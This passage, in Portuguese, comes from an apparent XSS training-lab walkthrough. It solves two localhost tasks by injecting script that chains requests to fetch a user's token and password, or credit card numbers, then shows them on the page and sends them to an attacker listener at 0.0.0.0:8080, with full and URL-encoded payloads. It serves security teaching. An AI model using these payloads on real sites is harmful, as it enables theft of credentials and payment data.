O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro *endpoint* da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, um JSON é retornado com o *token* do usuário. No segundo *endpoint*, outro JSON é entregue com a senha do usuário. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.

#### Conhecimento Base

O método `JSON.parse()` em JavaScript é usado para converter uma *string* formatada como JSON em um objeto JavaScript. Isso é útil quando você está lidando com dados JSON, como a resposta de uma solicitação AJAX ao servidor.

#### Exploração

Seguindo as instruções da *task*, ao acessarmos a URL abaixo, somos levados ao primeiro JSON que contém o *token* do usuário.

- [http://localhost/20/getToken/?user_id=3663](http://localhost/20/getToken/?user_id=3663)

![Primeiro JSON](/img/posts/2023-06-21-beyond-the-alert-64.png)

Ainda seguindo as instruções, a URL abaixo utiliza o id do usuário e o *token* obtido, fornecendo um próximo JSON com a senha do usuário.

- [http://localhost/20/getPass/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/20/getPass/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426)

![Segundo JSON](/img/posts/2023-06-21-beyond-the-alert-65.png)

Seguindo esta premissa, podemos utilizar o método `JSON.parse()` para tratar a resposta de todos os *requests* para imprimir os dados em tela, assim como enviá-los para a máquina sob controle do atacante.

```html
<script>
	var req = new XMLHttpRequest();
	var req2 = new XMLHttpRequest();
	id = document.getElementById("user_id").innerHTML.split(':')[1];

	req2.onreadystatechange = function() {
		if (req2.readyState == 4 && req2.status == 200) {
			resp = JSON.parse(req2.responseText);
			pass = resp.data.password;
			document.getElementById("exploit").innerHTML = pass;
			new Image().src = "http://0.0.0.0:8080/?pass="+pass;
		}
	}

	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			resp = JSON.parse(req.responseText);
			token = resp.params.token;

			req2.open("GET", "/20/getPass/?user_id="+id+"&token="+token, true);
			req2.send();
		}
	}

	req.open("GET", "/20/getToken/?user_id="+id, true);
	req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/20/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/20/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09id%20%3D%20document.getElementById%28%22user_id%22%29.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09pass%20%3D%20resp.data.password%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20pass%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fpass%3D%22%2Bpass%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09resp%20%3D%20JSON.parse%28req.responseText%29%3B%0A%09%09%09token%20%3D%20resp.params.token%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20%22%2F20%2FgetPass%2F%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20%22%2F20%2FgetToken%2F%3Fuser_id%3D%22%2Bid%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurado para ouvir a requisição feita.

![Python server](/img/posts/2023-06-21-beyond-the-alert-59.png)

Ao carregar a página, a informação sensível é carregada.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-66.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-67.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)

### *Task 21 - XML Parsing Multi-Level*


![Task 21](/img/posts/2023-06-21-beyond-the-alert-62.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro *endpoint* da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, um XML é retornado com o próximo *endpoint*, o *token* do usuário e o `user_id`. No segundo *endpoint*, um JSON é entregue com números de cartão de crédito. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.

#### Conhecimento Base

A propriedade `responseXML` do objeto `XMLHttpRequest` é usada para capturar a resposta do servidor quando é um documento XML. Se a resposta for um documento XML bem formado, `responseXML` retornará um objeto *Document*, que representa o documento XML e pode ser manipulado usando a API DOM (*Document Object Model*) do JavaScript.

Por exemplo, se você fizer uma solicitação a uma API que retorna um documento XML, você pode usar `responseXML` para obter esse documento e então usar a API DOM para buscar elementos específicos.

#### Exploração

Ao acessar o *link* "*API Endpoints*", somos levados a um XML que contém informações importantes sobre o próximo *endpoint*.

![XML](/img/posts/2023-06-21-beyond-the-alert-68.png)

Com a propriedade `responseXML` é possível fazer o *parsing* do XML e obter o valor de cada um dos campos com o método `getElementsByTagName()`.

Ao criar a URL abaixo com os dados capturados, somos levados a um JSON que contém os números de cartão de crédito.

- [http://localhost/21/creditCards/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/21/creditCards/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426)

![Cartões de crédito](/img/posts/2023-06-21-beyond-the-alert-69.png)

Com estas informações, podemos montar os *requests* sequenciais.

```html
<script>
	var req = new XMLHttpRequest();
	var req2 = new XMLHttpRequest();
	var link = document.getElementById("endpoints").href;

	req2.onreadystatechange = function() {
		if (req2.readyState == 4 && req2.status == 200) {
			var cards = JSON.parse(req2.responseText);
			var parsed = cards.card_1 + "<br>" + cards.card_2 + "<br>" + cards.card_3;
			document.getElementById("exploit").innerHTML = parsed;
			new Image().src = "http://0.0.0.0:8080/?c1="+cards.card_1+"&c2="+cards.card_2+"&c3="+cards.card_3;
		}
	}

	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			var id = req.responseXML.getElementsByTagName("user_id-param-value")[0].childNodes[0].nodeValue;
			var token = req.responseXML.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
			var endpoint = req.responseXML.getElementsByTagName("endpoint")[0].childNodes[0].nodeValue;

			req2.open("GET", endpoint+"?user_id="+id+"&token="+token, true);
			req2.send();
		}
	}

	req.open("GET", link, true);
	req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurado para ouvir a requisição feita.

![Python server](/img/posts/2023-06-21-beyond-the-alert-59.png)

Ao carregar a página, a informação sensível é carregada.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-70.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-71.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML)

## Conclusão

Enfim, estes foram meus 10 centavos da vez, resultado de experiência prática, erros e acertos, treinamentos e mais um tanto de bagagem.

Acredito ter expressado o que gostaria com este conteúdo, de somar na qualidade de ataques e no *mindset* de um teste.